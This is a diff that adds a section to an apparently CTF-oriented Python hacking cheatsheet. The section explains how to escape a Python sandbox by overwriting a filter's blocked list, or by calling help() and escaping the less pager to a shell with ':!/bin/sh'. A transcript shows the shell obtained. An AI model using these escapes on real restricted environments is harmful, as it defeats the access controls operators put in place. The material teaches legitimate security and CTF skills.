@@ -408,6 +408,37 @@ If a **shorter** payload (fewer bytes) is needed, you can mix and match these Un
 See [this site](https://gosecure.github.io/unicode-pentester-cheatsheet/) for a table of all Unicode transformations, as this trick is far from the only one. Look for "Normalization NFKC" as Python uses it for resolving function names
 {% endhint %}
 
+### Overwriting variables
+
+Sometimes you can abuse the environment that is sandboxing/evaluating your input, by altering it with your code. If there is a `blocked` list for example, you may be able to overwrite it with an empty array to disable the filter in your next attempt. You can get creative with whatever variables you can alter to get an exploitable effect.
+
+When it is possible to overwrite a _function_ that will be called, a simple way out is to call the `help()` function. This provides an interactive shell where you can get help pages about Python objects. When the content is sufficiently large, you will be put into a `less` editor where you can scroll around, but more importantly, [escape](https://gtfobins.github.io/gtfobins/less/#shell)!
+
+<pre class="language-python"><code class="lang-python"><strong>>>> help()
+</strong><strong>help> str
+</strong>Help on class str in module builtins:
+
+class str(object)
+ |  str(object='') -> str
+ |  str(bytes_or_buffer[, encoding[, errors]]) -> str
+ |
+...
+<strong>:!/bin/sh
+</strong>$ id
+uid=1001(user) gid=1001(user) groups=1001(user)
+</code></pre>
+
+Note that it gives an error when you provide a string that is not a Python object like `help("anything")` instead of `help("str")`.
+
+```python
+# Works
+>>> help("str")      # gives "str" documentation
+>>> help(1)          # interpreted as "int"
+# Doesn't work
+>>> help("anything") # Error: "anything" not recognized
+>>> help(1, 2)       # Error: too many arguments
+```
+
 ## PyInstaller Reversing
 
 [PyInstaller](https://pyinstaller.org/en/stable/) can create executable and shareable files from Python scripts, like Windows `.exe` files or Linux ELF files. It can also be used for malware where an attacker creates a malicious Python script and compiles it to an executable they can plant somewhere with PyInstaller. That is why Reversing such a file can be very useful, and it turns out the full source code can almost flawlessly be decompiled from such a file.&#x20;
